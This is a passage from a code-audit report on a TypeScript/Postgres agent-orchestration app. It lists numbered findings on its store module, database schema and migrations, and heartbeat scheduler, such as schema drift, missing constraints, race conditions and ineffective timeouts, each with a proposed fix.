- **Observation:** `resetCompany` clears in-memory only; `clearPersistedStoreState` clears DB only. Neither clears both. Call in the wrong order and the remaining side persists its old state back over the cleared side — silent data loss or silent un-delete.
- **Why it matters:** even without malice, an operator calling `resetCompany` expects "start over" behavior. What they get is "empty in-memory, DB intact, next mutation will overwrite the DB with emptiness." The opposite call has the opposite trap.
- **Proposed fix:** see `fix.md` F-148 — one explicit API with a mode flag (`resetCompany({ scope: "memory" | "persistent" | "both" })`); never offer reset-one-side functions without pairing.

#### F-149 🟠 [code][arch] · `getSnapshot` / `getEvents` return live mutable references (F-045 family)
- **Where:** `apps/api/src/persistence/store.ts:90-96`.
- **Observation:** callers can mutate the store directly:
  ```ts
  getSnapshot().tasks.push(fake);              // added; no audit, no persist
  getSnapshot().company.budgetCents = 0;       // budget zeroed silently
  getEvents().length = 0;                      // audit wiped
  ```
- **Proposed fix:** see `fix.md` F-149 — return `Readonly<CompanySnapshot>` / `ReadonlyArray<EventEnvelope>` via type casts; bundled with F-144's class refactor (private fields + readonly getters).

#### F-150 🟠 [arch] · `applyStrategy` is a 154-line god function
- **Where:** `apps/api/src/persistence/store.ts:448-601`.
- **Observation:** one function validates role hierarchy, builds node IDs, links parents, computes levels via recursion + cache, assembles agents + sessions + memories, calls `replaceState`, constructs an event envelope inline, and fires `storeEvents.emit("agents-hired")`. Six+ unrelated responsibilities.
- **Proposed fix:** see `fix.md` F-150 — extract to `company-runtime/strategy/apply.ts` with named sub-helpers (`buildHierarchy`, `deriveAgents`, `createStrategyProposedEvent`).

#### F-151 🟠 [type] · Five `as` casts on status/role types
- **Where:** `apps/api/src/persistence/store.ts:394-395, 404, 459, 472, 475, 515, 521`.
- **Observation:** `updateAgentStatus(status: string)` casts to `AgentIdentity["status"]`. `updateCompanyStatus(status: string)` casts to the company status type. `applyStrategy` casts roles three times. All accept strings without runtime validation — the type system is comforting the caller while accepting invalid data.
- **Proposed fix:** see `fix.md` F-151 — narrow parameters via Zod enums from contracts; replace `as` with `schema.parse(status)` at the boundary.

#### F-152 🟡 [code] · Upsert pattern duplicated 5 times
- **Where:** `apps/api/src/persistence/store.ts:197, 246, 284, 302, 338` (`upsertTask`, `upsertSprint`, `upsertMeeting`, `upsertApproval`, `upsertMeetingSchedule`).
- **Observation:** five near-identical bodies using `findIndex → spread → conditional assign → replaceState`. Same shape, different entity fields.
- **Proposed fix:** see `fix.md` F-152 — generic `upsertById<T extends { id: string }>(arr, item)` helper.

#### F-153 🟡 [code] · Inconsistent push/unshift across upserts
- **Where:** `apps/api/src/persistence/store.ts:204, 291, 309`.
- **Observation:** `upsertTask` appends with `push`. `upsertMeeting` and `upsertApproval` prepend with `unshift`. Three entities, two insert orders, no documented reason.
- **Proposed fix:** see `fix.md` F-153 — parameterize position on the generic helper (F-152); pick one default.

#### F-154 🟡 [perf][code] · `createEmptyCompanySnapshot()` called 3 times in one bootstrap
- **Where:** `apps/api/src/persistence/store.ts:412, 415, 432`.
- **Observation:** three calls during a single bootstrap. If `createEmptyCompanySnapshot` ever becomes non-pure (generates timestamps, ids), the three values diverge and consistency breaks.
- **Proposed fix:** see `fix.md` F-154 — `const empty = createEmptyCompanySnapshot();` once; reuse.

#### F-155 🟡 [code] · `"company_pending"` / `"pending-runtime-binding"` magic strings
- **Where:** `apps/api/src/persistence/store.ts:168, 533`.
- **Observation:** two sentinels — "no company" and "no runtime binding yet." Same F-012 family.
- **Proposed fix:** see `fix.md` F-155 — exported constants; bundled with F-012.

#### F-156 🟡 [code] · Hardcoded agent names
- **Where:** `apps/api/src/persistence/store.ts:78-88`.
  ```ts
  if (role === "ceo") return "Avery";
  // ... 7 more
  ```
- **Observation:** role-to-name mapping in code. Operators can't customize without editing source.
- **Proposed fix:** see `fix.md` F-156 — move to `config/agent-names.ts`; allow per-company overrides.

#### F-157 🟡 [code] · Hardcoded model deployment names
- **Where:** `apps/api/src/persistence/store.ts:535`.
  ```ts
  model: agent.role === "ceo" ? "azure/ceo-deployment" : "azure/worker-deployment"
  ```
- **Observation:** provider path + deployment name hardcoded. Should derive from `runtimeConfig` / `ensureDeployment(...)` the way azure-openai.ts already does.
- **Proposed fix:** see `fix.md` F-157 — import + use the deployment helper.

#### F-158 🟡 [code] · CEO magic string × 3 in one file (F-098 family)
- **Where:** `apps/api/src/persistence/store.ts:522, 535, 585`.
- **Observation:** three inline `role === "ceo"` checks controlling status, model, and fallback actor id.
- **Proposed fix:** see `fix.md` F-158 — bundled with F-098 role enum; consider a single `CEO_ROLE` constant.

#### F-159 🟡 [perf] · O(N²) hierarchy level via `hierarchy.find` inside recursion
- **Where:** `apps/api/src/persistence/store.ts:483-500`.
- **Observation:** recursive `computeNodeLevel` calls `hierarchy.find(...)` inside each level of recursion. For N nodes, worst case O(N²). Small today (N < 20), bad as the hierarchy grows.
- **Proposed fix:** see `fix.md` F-159 — build a `nodeById: Map<string, HierarchyNode>` once; use O(1) lookup.

#### F-160 🟡 [code] · Level cache keyed by role, not node id
- **Where:** `apps/api/src/persistence/store.ts:494`.
- **Observation:** `hierarchyLevelCache.set(node.role, level)`. Works only because roles are unique within this hierarchy. If the data model ever allows duplicate roles (multiple developers, multiple testers), the cache returns wrong levels.
- **Proposed fix:** see `fix.md` F-160 — key the cache by `node.id`, not `node.role`.

#### F-161 🟡 [code] · `applyStrategy` mutates hierarchy nodes in place
- **Where:** `apps/api/src/persistence/store.ts:477-479`.
  ```ts
  node.parentNodeId = parent?.id ?? null;
  parent.directReportNodeIds.push(node.id);
  ```
- **Observation:** mutates the array items that were just created. Contrary to the immutable-update style used everywhere else in the file.
- **Proposed fix:** see `fix.md` F-161 — build the final hierarchy via `.map(...)` returning new nodes with populated fields; no in-place mutation.

#### F-162 🟡 [code] · `updateCompanySprint(string | null, number | null)` polymorphic signature
- **Where:** `apps/api/src/persistence/store.ts:273-282`.
- **Observation:** accepts both "set" and "clear" via null. Callers have to remember which null means which.
- **Proposed fix:** see `fix.md` F-162 — split: `setCurrentSprint(id, number)` and `clearCurrentSprint()`.

#### F-163 🟡 [code] · Deprecated re-exports should be deleted
- **Where:** `apps/api/src/persistence/store.ts:175-178`.
- **Observation:** `hydrateStoreFromPersistence` and `flushStorePersistence` marked `@deprecated`. Aliases for the real names.
- **Proposed fix:** see `fix.md` F-163 — grep callers, migrate, delete the aliases.

#### F-164 🟡 [type] · No runtime validation at the store boundary
- **Where:** every `upsert*` / `update*` / `apply*` across the file.
- **Observation:** the store accepts typed TypeScript only. If a caller (or upstream `as any` cast) slips a malformed object, it lands in the store unchecked.
- **Proposed fix:** see `fix.md` F-164 — `schema.parse(input)` at the entry of each upsert/update. Cost is small (Zod parse is fast); the boundary is explicit.

#### F-165 🟡 [obs] · No audit trail for direct mutations
- **Where:** all `upsert*` / `update*` across the file.
- **Observation:** the only mutation path that audits is `cpApplyMutations`. Direct callers of `upsertTask` etc. (from routes, orchestration, heartbeats) bypass audit. The generic `storeEvents.emit("state-changed")` fires but carries no detail about *what* changed.
- **Proposed fix:** see `fix.md` F-165 — emit a structured event with entity kind + id + op; control-plane can audit from the event bus rather than every call site duplicating audit code.

#### F-166 🟡 [arch] · No batch / transaction primitive
- **Where:** file-level concern.
- **Observation:** every upsert/update fires its own `replaceState` → `persistState` → `state-changed` emit. A caller doing 10 related mutations fires 10 persists + 10 events. No way to group.
- **Proposed fix:** see `fix.md` F-166 — `batch(() => { mutations })` that suppresses persist + events until the batch closure returns.

#### F-167 🟡 [type] · `node.agentId!` non-null assertion
- **Where:** `apps/api/src/persistence/store.ts:511`.
- **Observation:** `node.agentId!` — the `!` claims it's defined. In context it's safe (agentId is set at line 454) but the assertion is a red flag.
- **Proposed fix:** see `fix.md` F-167 — declare the local `agentId` as non-optional explicitly; if the type allows undefined, fail loudly.

#### F-168 🟡 [type] · `?? []` fallbacks on transitions / feedbackRounds / meetingSchedules
- **Where:** `apps/api/src/persistence/store.ts:339, 352, 372, 378, 386`.
- **Observation:** multiple `snapshot.X ?? []`. Either these fields are required (remove fallbacks) or they're optional (declare as `?:`). Silent fallbacks hide type-model drift.
- **Proposed fix:** see `fix.md` F-168 — audit the snapshot schema; decide and commit.

#### F-169 🟡 [perf] · `flush` doesn't short-circuit on clean cache
- **Where:** `apps/api/src/persistence/store.ts:133-139`.
  ```ts
  export async function flush(): Promise<void> {
    await flushPersistedCompanyState();   // always called
    if (dirty) { dirty = false; lastFlushedAt = new Date().toISOString(); }
  }
  ```
- **Observation:** even when `dirty === false`, we call `flushPersistedCompanyState`. Either it's a no-op (then why check `dirty`?) or it does unnecessary work on clean caches.
- **Proposed fix:** see `fix.md` F-169 — early return when clean: `if (!dirty) return;`.

#### F-170 🟡 [code] · Inline `EventEnvelope` construction in `applyStrategy`
- **Where:** `apps/api/src/persistence/store.ts:574-592`.
- **Observation:** 18 lines of manual event construction inside an already-huge function (F-150). Uses magic strings (`"strategy.proposed"`), hardcoded fallback actor (`"agent_ceo"`).
- **Proposed fix:** see `fix.md` F-170 — `createStrategyProposedEvent(strategy, roles, ceoAgentId)` helper in `@arceus/company-runtime`.

#### F-171 🟢 [perf] · `updateAgentMemory` rebuilds full memories array on every update
- **Where:** `apps/api/src/persistence/store.ts:360-367`.
- **Observation:** `.map()` produces a new array for every memory update. O(N) per update. Trivial today; bears watching.
- **Proposed fix:** see `fix.md` F-171 — if this ever matters, store memories in a `Map<agentId, MemorySummary>` for O(1) updates.

#### F-172 🟢 [code] · Mutating index of cloned array instead of functional `.map`
- **Where:** `apps/api/src/persistence/store.ts:202` and peers.
  ```ts
  const nextTasks = [...snapshot.tasks];
  nextTasks[existing] = task;           // mutation
  ```
- **Observation:** works (clone owns the slot) but inconsistent with the functional style elsewhere (`transitions.map(...)`).
- **Proposed fix:** see `fix.md` F-172 — use `.map((t, i) => i === existing ? task : t)` for consistency.

---

### `packages/db/*` — DB layer (5 source files + 8 migrations)

#### F-173 🔴 [arch][data-model] · Three-way schema drift — `schema.ts` metadata claims 24 entities; only 14 are real tables
- **Where:** `packages/db/src/schema.ts` (24 entities in `arceusTableDefinitions`) vs `packages/db/src/tables.ts` (11 Drizzle tables) vs `packages/db/src/memory-tables.ts` (3 Drizzle tables).
- **Observation:** three files each claim to describe the schema. They don't agree. 10 "entities" (`companies`, `ideas`, `strategies`, `sprints`, `hierarchy`, `agents`, `sessions`, `tasks`, `chatMessages`, `meetings`, `approvals`, `events`, `memorySummaries`) have no Drizzle table and no DB table — they live only as serialized fields inside the `company_states.snapshot_data jsonb` blob.
- **Why it matters:**
  1. **Metadata lies.** `arceusTableDefinitions` declares `indexes: ["company_id", "status"]` for ghost entities that have no table. No code creates those indexes.
  2. **`EntityName` union + `EntityRecordMap` include impossible entities.** The `DatabaseAdapter` interface typechecks for 24 entities; 10 would throw at runtime.
  3. **Three sources of truth** can drift independently — add a field in tables.ts, forget to update schema.ts, downstream consumers of the metadata miss it.
- **Proposed fix:** see `fix.md` F-173 — either promote the 10 ghost entities to real tables (F-002 Stage B), or delete them from `schema.ts`/`EntityName`/`EntityRecordMap`.

#### F-174 🔴 [arch][perf] · Entire `CompanySnapshot` serialized into one `snapshot_data jsonb` column
- **Where:** `packages/db/src/tables.ts:85-97` (`companyStatesTable`).
- **Observation:** the whole company state — every task, sprint, meeting, approval, chat message, artifact, session, agent — lives inside a single jsonb field. Every mutation rewrites the entire blob.
- **Why it matters:**
  1. **No relational queries.** Can't `SELECT * FROM tasks WHERE status = 'in_progress'` — must fetch the whole JSON, deserialize, filter in application code.
  2. **No per-entity indexes.** Task status, sprint id, agent id all live inside JSON. GIN indexes on JSONB exist but none are configured.
  3. **Write amplification.** One task status change rewrites megabytes.
  4. **TOAST pressure.** Blobs > ~2KB trigger out-of-line storage; perf degrades as the company grows.
  5. **Single-row lock contention.** Concurrent mutations race on one row's version — root cause of F-086 (CAS disabled).
  6. **F-002's durability gap at the DB level.** The write-back cache treats Postgres as an object store.
- **Proposed fix:** see `fix.md` F-174 — F-002 Stage B — extract domain tables (tasks, sprints, meetings, approvals, agents, sessions) out of the blob.

#### F-175 🟠 [integrity] · Zero foreign keys across 14 real tables (except 2 self-references)
- **Where:** `packages/db/src/tables.ts` + `memory-tables.ts`.
- **Observation:** every `company_id`/`agent_id`/`task_id`/`sprint_id`/`beat_id` column is declared `text NOT NULL` — never `REFERENCES companies(id)`. Only exceptions: `memory_units.previous_version_id` + `skill_artifacts.mutated_from_id` (self-refs).
- **Why it matters:**
  1. **Orphan records.** Beat records for deleted agents; audit events for deleted companies.
  2. **No `ON DELETE CASCADE`** — deleting a company leaves governance/beat/audit records forever.
  3. **DB can't enforce integrity** — every invariant relies on application code (and the app code has 140+ documented flaws).
- **Proposed fix:** see `fix.md` F-175 — add FKs + `ON DELETE` policies in migrations. Depends on F-173 (ghost entities → real tables first).

#### F-176 🟠 [integrity] · Missing unique constraints on logical keys
- **Where:** multiple tables.
  | Table | Should be unique | Current |
  |---|---|---|
  | `service_registry` | `(company_id, tool_name)` | not enforced |
  | `audit_events` | `(company_id, sequence)` | not enforced |
  | `beat_records` | `(agent_id, beat_number)` | not enforced |
- **Observation:** only `skill_artifacts` has the right `UNIQUE(company_id, name, version)`. Every other table trusts application code.
- **Why it matters:** duplicate rows bypass "latest wins" logic, produce double-billing in `beat_records`, break audit sequence monotonicity.
- **Proposed fix:** see `fix.md` F-176 — per-table `ADD CONSTRAINT UNIQUE (...)` migrations.

#### F-177 🟠 [docs vs reality] · `schema.ts` `indexes` field is never enforced
- **Where:** `packages/db/src/schema.ts` — `indexes: [...]` array on every entity.
- **Observation:** no code reads the array. It's documentation that may or may not match the migrations, which may or may not match the live DB.
- **Why it matters:** `SELECT ... WHERE agent_id = ?` on `beat_records` may or may not be indexed — the metadata claims it is, the migration may not create it.
- **Proposed fix:** see `fix.md` F-177 — delete the `indexes` field entirely (it's a lie); declare indexes in Drizzle + migration SQL only.

#### F-178 🟠 [ops][data-integrity] · No `_migrations` tracking table — migrations can be re-applied
- **Where:** entire `packages/db/migrations/` subsystem.
- **Observation:** no row anywhere records which migrations have been applied. Running `run-007.ts` twice re-applies migration 007. The `IF EXISTS` / `IF NOT EXISTS` guards in the SQL make most operations idempotent, but the pattern relies on author discipline, not schema.
- **Why it matters:**
  1. **No CI guarantee** migrations run exactly once.
  2. **No environment drift detection** — can't ask "which migrations has staging applied that prod hasn't?"
  3. **No rollback registry** — if a migration is retired, no signal.
- **Proposed fix:** see `fix.md` F-178 — adopt Drizzle's migration runner OR roll a minimal `_migrations(name text primary key, applied_at timestamptz)` table + single runner. (Already proposed in folder-audit PR 5.)

#### F-179 🟠 [ops] · 9 per-migration runner scripts + no "apply-all-pending" command
- **Where:** `packages/db/migrations/run-001b.ts` … `run-007.ts` + `force-complete-sprint.ts` + `verify.ts`.
- **Observation:** each runner is a copy-paste of ~20 lines: load env, read a specific SQL file, strip `BEGIN`/`COMMIT`, run inside a transaction.
- **Why it matters:**
  1. **Operator burden** — prod deploys must run each runner by name in the right order.
  2. **Drift risk** — any change to the runner pattern needs 9 edits.
  3. **No state tracking** (F-178).
- **Proposed fix:** see `fix.md` F-179 — single generic `packages/db/src/migrate.ts`, deletes all per-migration runners.

#### F-180 🟠 [safety] · `BEGIN`/`COMMIT` in every migration + no `CREATE INDEX CONCURRENTLY` = blocking index builds
- **Where:** all SQL files in `packages/db/migrations/`.
- **Observation:** every migration uses `BEGIN;` at top, `COMMIT;` at bottom (runners strip and re-wrap). **Zero `CREATE INDEX CONCURRENTLY` anywhere.** Every index creation holds `ACCESS EXCLUSIVE` lock on its table for the build duration.
- **Why it matters:** on an empty dev DB it works. On a production table with rows, every index migration **blocks writes for the build duration** (seconds to minutes depending on size). Classic migration footgun.
- **Proposed fix:** see `fix.md` F-180 — mandatory `CONCURRENTLY` on index adds; runner must detect "this file can't be transactional" and skip wrapping.

#### F-181 🟠 [perf] · Connection pool cap of 5
- **Where:** `packages/db/src/client.ts:70-75`.
  ```ts
  sqlClient = postgres(config.databaseUrl, {
    max: 5, prepare: false, idle_timeout: 20, connect_timeout: 10,
  });
  ```
- **Observation:** maximum 5 simultaneous connections. For a server with concurrent HTTP requests + heartbeat beats + meeting pipelines + hippocampus reads, 5 is tiny.
- **Why it matters:** pool saturation under modest load; requests queue; p99 latency degrades. Invisible until it hurts.
- **Proposed fix:** see `fix.md` F-181 — move to env (`ARCEUS_PG_POOL_SIZE`, default 20); add observability when saturated.

#### F-182 🟠 [type][drift] · Migration 001 declares `id TEXT` but `memory-tables.ts` declares `id: uuid`
- **Where:** `packages/db/migrations/001_hippocampus_memory.sql` (`id TEXT PRIMARY KEY`) vs `packages/db/src/memory-tables.ts:21` (`id: uuid("id").primaryKey().defaultRandom()`).
- **Observation:** the DB column is TEXT. Drizzle claims it's UUID. Similar drift for `company_id`, `agent_id`.
- **Why it matters:**
  1. Runtime works (Postgres accepts UUID strings in TEXT), but typed `select` lies about what the DB returns.
  2. Any raw SQL relying on `uuid` type (`gen_random_uuid()`) breaks.
  3. Equality filters look type-safe but only by convention.
- **Proposed fix:** see `fix.md` F-182 — pick one: migrate columns to `UUID` via `ALTER TABLE ... ALTER COLUMN id TYPE uuid USING id::uuid`, or change Drizzle to `text("id")`.

#### F-183 🟡 [code] · `DatabaseAdapter` interface + `NoopDatabaseAdapter` are dead code
- **Where:** `packages/db/src/types.ts:97-104`, `packages/db/src/client.ts:139-181`.
- **Observation:** defines a generic `list`/`getById`/`upsert`/`delete` adapter and a no-op in-memory implementation. Every real consumer imports `getDb()` directly (Drizzle client). The adapter interface is unused.
- **Proposed fix:** see `fix.md` F-183 — delete `DatabaseAdapter`, `NoopDatabaseAdapter`, and related `EntityRecordMap` methods.

#### F-184 🟡 [code] · `tables.ts` duplicates every column spec across ternary branches
- **Where:** `packages/db/src/tables.ts` — 11 tables × ~15 columns each.
  ```ts
  export const someTable = arceusSchema ? arceusSchema.table("x", { ...cols }) : pgTable("x", { ...cols });
  ```
- **Observation:** every column block repeated verbatim. `memory-tables.ts` uses a `defineTable` helper correctly; tables.ts doesn't.
- **Proposed fix:** see `fix.md` F-184 — port the `defineTable` pattern; ~150 lines of duplication deleted.

#### F-185 🟡 [code] · Env-var aliases sprawl (and still reference `PAPERCLIP_*` names)
- **Where:** `packages/db/src/client.ts:38-40`, `memory-tables.ts:8-11`.
- **Observation:** three aliases for the DB URL (`SUPABASE_DB_URL`, `ARCEUS_HIPPOCAMPUS_POSTGRES_URL`, `DATABASE_URL`); two for Supabase URL (one of which is `PAPERCLIP_STORAGE_SUPABASE_PROJECT_URL` — a legacy Paperclip name still in the codebase); two for schema name.
- **Proposed fix:** see `fix.md` F-185 — deprecate all but canonical names; log warning when falling back.

#### F-186 🟡 [integrity] · No `CHECK` constraints on enum-like `text` columns (except migration 001)
- **Where:** `workspaces.status`, `beat_records.status`, `trust_scores`, `policy_violations.severity` + `decision` — all `text` with no constraint.
- **Observation:** only migration 001 is disciplined — `memory_units.memory_type` has `CHECK (memory_type IN ('static', 'dynamic'))`. Later migrations drop this.
- **Proposed fix:** see `fix.md` F-186 — `ADD CONSTRAINT CHECK (...)` per status/severity column.

#### F-187 🟡 [fragility] · `load-env.ts` uses hardcoded relative path to `.env.local`
- **Where:** `packages/db/src/load-env.ts:6`.
  ```ts
  const repoEnvPath = resolve(currentDir, "../../../.env.local");
  ```
- **Observation:** assumes the compiled file is exactly 3 levels under the env file. Breaks when bundled/published/extracted.
- **Proposed fix:** see `fix.md` F-187 — find-up from `process.cwd()`; skip silently if absent.

#### F-188 🟡 [convention] · Migration number gap (`001, 001b, 002, …`)
- **Where:** `packages/db/migrations/001b_fix_schema.sql`.
- **Observation:** inserted between 001 and 002 because 001 was already applied elsewhere. The naming scheme didn't plan for this.
- **Proposed fix:** see `fix.md` F-188 — adopt a convention (timestamp-prefixed filenames like Rails, or strictly monotonic integers with "patch" migrations numbered forward).

#### F-189 🟡 [docs vs reality] · Claimed indexes in `schema.ts` don't all exist in migrations
- **Where:** `schema.ts` vs migration SQL.
- **Observation:** e.g. `beat_records` claims 5 indexes (`company_id, agent_id, started_at, beat_number, status`); migration 004 may create a subset.
- **Proposed fix:** see `fix.md` F-189 — CI step that parses `schema.ts` claims, queries `pg_indexes` on a shadow DB, asserts match. Or — preferably — delete `schema.ts`'s `indexes` field (F-177) so nothing lies.

#### F-190 🟡 [automation] · `updated_at` trigger only on hippocampus tables
- **Where:** migration 001 creates `update_updated_at_column()` for `memory_units`, `habits`, `priming_state`. Later tables (`workspaces`, `company_states`, `beat_records`) don't have it.
- **Observation:** Drizzle's `.defaultNow()` only fires on INSERT. Any UPDATE leaves `updated_at` stale on the non-hippocampus tables.
- **Proposed fix:** see `fix.md` F-190 — apply the trigger to every table with an `updated_at` column.

#### F-191 🟡 [sec] · No Row-Level Security (RLS) configured
- **Where:** no migration mentions RLS.
- **Observation:** Supabase best practice: `ENABLE ROW LEVEL SECURITY` + policies on every tenant-scoped table. None of these tables have it. Today: single-tenant per process, fine. Multi-tenant: one compromised query exposes all customers.
- **Proposed fix:** see `fix.md` F-191 — RLS migration when multi-tenant lands; policies filter by `company_id`.

#### F-192 🟡 [ci][drift] · No schema-drift check in CI
- **Where:** CI / test pipeline.
- **Observation:** nothing compares Drizzle schema against the live DB. `drizzle-kit check` exists but isn't wired.
- **Proposed fix:** see `fix.md` F-192 — `drizzle-kit check` in CI, blocking on drift.

#### F-193 🟡 [structure] · `force-complete-sprint.ts` + `verify.ts` live in `migrations/`
- **Where:** `packages/db/migrations/force-complete-sprint.ts`, `verify.ts`.
- **Observation:** these are ad-hoc maintenance scripts, not migrations. Placing them alongside actual migration runners confuses the mental model.
- **Proposed fix:** see `fix.md` F-193 — move to `packages/db/src/scripts/` or repo-root `scripts/db/`.

#### F-194 🟡 [perf] · `getDb()` lazy-init delays the first request
- **Where:** `packages/db/src/client.ts:63-83`.
- **Observation:** first `getDb()` call after process start pays connection setup + prepare cost. Subsequent are cached.
- **Proposed fix:** see `fix.md` F-194 — eager init in `startServer()`; verify health before accepting traffic.

#### F-195 🟡 [ops] · `closeDbConnections` 5s shutdown timeout isn't coordinated with F-039
- **Where:** `packages/db/src/client.ts:131` (`sqlClient.end({ timeout: 5 })`) and F-039's overall shutdown budget.
- **Observation:** DB drain has its own 5s limit; overall shutdown (F-039) has a different proposed 10s budget. If the two aren't aligned, the DB connection may be cut before a pending query completes.
- **Proposed fix:** see `fix.md` F-195 — single `ARCEUS_SHUTDOWN_TIMEOUT_MS` env; divide across stages (DB drain, engine stop, app close).

#### F-196 🟡 [ops] · No backup / restore runbook
- **Observation:** no docs on `pg_dump`, PITR, DR procedures. Supabase provides backups on Pro+; nothing references them.
- **Proposed fix:** see `fix.md` F-196 — `docs/db/backup-restore.md`; quarterly PITR drill.

#### F-197 🟡 [data-model] · `previous_version_id` is the only declared cross-row relationship
- **Where:** `packages/db/migrations/001_hippocampus_memory.sql` (memory_units self-ref).
- **Observation:** implies intent for version chains but no code walks the chain, no cleanup on delete, no UI.
- **Proposed fix:** see `fix.md` F-197 — either implement version-history features or remove the column.

#### F-198 🟢 [perf] · `structuredClone` per-record in `NoopDatabaseAdapter.list`
- **Where:** `packages/db/src/client.ts:145`.
- **Observation:** fine at 100 records, slow at 10k. Moot since the adapter is dead code (F-183).

#### F-199 🟢 [code] · `beat_records.cost_cents` is `numeric(12, 4)` — returned as string (F-116 family)
- **Where:** `packages/db/src/tables.ts:199`.
- **Observation:** Drizzle returns `numeric` as string to preserve precision. No comment explains the choice. Already covered as F-116.

#### F-200 🟢 [code] · Deprecated exports live alongside active ones
- **Where:** re-exports in `packages/db/src/index.ts` + any deprecated aliases.
- **Observation:** adds surface area without value.
- **Proposed fix:** see `fix.md` F-200 — audit exports; delete deprecated aliases.

#### F-201 🟢 [docs] · Migration files lack "why" headers
- **Where:** all migration SQL.
- **Observation:** each migration has a one-line title ("Migration 007: Skill Artifacts"). None explain the problem solved, dependencies, rollback cost.
- **Proposed fix:** see `fix.md` F-201 — header template: `-- Problem: ... Solution: ... Dependencies: ... Rollback: ...`.

#### F-202 🟢 [type] · No `drizzle-zod` reconciliation between Zod schemas and Drizzle tables
- **Where:** `packages/db/src/tables.ts` vs `packages/contracts/src/*.ts`.
- **Observation:** Drizzle and Zod schemas are hand-kept-in-sync. `drizzle-zod` auto-derives one from the other.
- **Proposed fix:** see `fix.md` F-202 — adopt `drizzle-zod`; replace hand-written contract schemas with derived ones where reasonable.

---

### `packages/company-runtime/src/heartbeat.ts`

#### F-203 🔴 [reliability][concurrency] · `expireStale` releases lock but not semaphore → slot leak on hangs
- **Where:** `packages/company-runtime/src/heartbeat.ts:119-130` + `tick()` at `:405`.
- **Observation:** when a beat hangs inside an async call (e.g. `deps.executeTask` on a dead OpenCode), the `timedOut` flag fires but the cooperative check never runs. `expireStale` later deletes the lock. **The semaphore slot is still held by the zombie beat.** Under sustained hangs, every slot accumulates a zombie; `semaphore.tryAcquire()` returns false; scheduler goes silent.
- **Why it matters:** permanent scheduler failure requiring process restart. No audit, no alert — just beats stop firing.
- **Proposed fix:** see `fix.md` F-203 — `expireStale` must also release the semaphore for every evicted agent, or lock+slot must be owned atomically.

#### F-204 🔴 [concurrency] · `beatCounter` race produces wrong `beatNumber` on concurrent beats
- **Where:** `packages/company-runtime/src/heartbeat.ts:166, 269, 702`.
  ```ts
  private beatCounter = 0;
  const beatId = `beat_${++this.beatCounter}_${Date.now()}`;
  // ... later:
  return { beatNumber: this.beatCounter, ... };  // reads current value, not the one assigned at beatId creation
  ```
- **Observation:** two concurrent beats (A increments to 5, B to 6). A calls `buildRecord` → reads `this.beatCounter` = 6, claims `beatNumber: 6`. B also claims 6. **Both records share a beatNumber.** Downstream queries ordering by `beatNumber` return wrong results.
- **Proposed fix:** see `fix.md` F-204 — capture `beatNumber` into a local at beatId creation; pass through to `buildRecord`.

#### F-205 🟠 [reliability] · `timedOut` is cooperative; no `AbortSignal` interrupts hangs
- **Where:** `packages/company-runtime/src/heartbeat.ts:466-467, 519, 550, 617`.
- **Observation:** flag is checked only at phase boundaries. Any async hang between checks runs forever. No signal is threaded into `loadAgentContext`, `executeTask`, `executeChecklistAction`. Cooperative only.
- **Why it matters:** combined with F-079 (no fetch timeout), F-119 (no LLM timeout), F-132 (no AbortSignal on LLM calls), the heartbeat has **zero actual cancellation capability**. The timeout is theater.
- **Proposed fix:** see `fix.md` F-205 — `AbortController` per beat; pass `signal` into every dep call.

#### F-206 🟠 [obs] · `commitBeatRecord` silent failure (F-112 family)
- **Where:** `packages/company-runtime/src/heartbeat.ts:283`.
  ```ts
  this.deps.commitBeatRecord(record).catch(() => {});
  ```
- **Observation:** empty catch. Beat record lost, no audit, no metric. Same class as F-006/F-091/F-112.
- **Proposed fix:** see `fix.md` F-206 — route failure through audit + Prometheus counter. Bundled with F-112.

#### F-207 🟠 [arch] · `fourPhaseExecutor` is a 214-line god function
- **Where:** `packages/company-runtime/src/heartbeat.ts:451-664`.
- **Observation:** single function handles all four phases, 7 skip-reason branches, timeout checks, error handling, and record building. SRP shredded; impossible to test phases in isolation.
- **Proposed fix:** see `fix.md` F-207 — extract `phase1Wake`, `phase2Observe`, `phase3Execute`, `phase4Serialize` as separate methods returning typed `PhaseResult<T>`.

#### F-208 🟠 [code][cost] · Cost estimate hardcoded at $0.001/1K tokens (ties to F-118 / F-199)
- **Where:** `packages/company-runtime/src/heartbeat.ts:697`.
  ```ts
  const costCents = Math.ceil(totalTokens / 1000 * 0.1);
  ```
- **Observation:** Azure OpenAI real pricing: GPT-4o ~$2.50/M input + $10/M output; GPT-4-turbo ~$10 + $30; GPT-3.5 ~$0.50 + $1.50. A flat $0.001/1K is arbitrary. Input vs output not distinguished. Combined with F-118 (token double-counting), every BeatRecord's `costCents` is fiction.
- **Proposed fix:** see `fix.md` F-208 — per-deployment rates from `runtimeConfig`; separate input/output; bundle with F-118.

#### F-209 🟠 [reliability] · Budget enforcement is post-hoc, not pre-emptive
- **Where:** `packages/company-runtime/src/heartbeat.ts:508, 577-580`.
- **Observation:** `pauseWhenBudgetExhausted` is checked **once** at phase 1 entry. Inside the beat, if `executeTask` spends $500, the post-hoc check marks `BUDGET_EXCEEDED` — but the money is gone. Similarly for the per-beat token budget.
- **Proposed fix:** see `fix.md` F-209 — pass budget into `executeTask`; executor aborts mid-call when approaching limit. Requires budget-aware LLM wrapper.

#### F-210 🟠 [obs] · Error message truncated (F-011 family)
- **Where:** `packages/company-runtime/src/heartbeat.ts:655-656`.
  ```ts
  errorMessage = err instanceof Error ? err.message : String(err);
  summary = `Beat failed: ${errorMessage}`;
  ```
- **Observation:** `.message` only; stack, cause, error class dropped.
- **Proposed fix:** see `fix.md` F-210 — extend `BeatRecord` with `errorDetail: SerializedError`; use F-011's helper.

#### F-211 🟠 [reliability] · No engine-level retry on transient failures
- **Where:** entire engine — failures in `executeTask` / `loadAgentContext` fail the beat.
- **Observation:** a transient network error or rate limit from an LLM call kills the whole beat. Next scheduled beat may be minutes away.
- **Proposed fix:** see `fix.md` F-211 — classify errors via F-125's typed errors; retry internally with backoff (caller-side already uses `resilientCall` for fetch, but engine-side still fails on retryable classifications that slip through).

#### F-212 🟠 [reliability] · No stranded-beat recovery (Paperclip parity gap)
- **Where:** `packages/company-runtime/src/heartbeat.ts:405-408` (`expireStale` just releases locks).
- **Observation:** Paperclip's model: detect stranded beat → release lock → enqueue ONE recovery wake → cap retries at 40 → mark blocked. Arceus just deletes the lock and waits for natural re-scheduling.
- **Why it matters:** hung beats leave work mid-completion with no signal to resume. Operators can't distinguish "agent working" from "agent zombie."
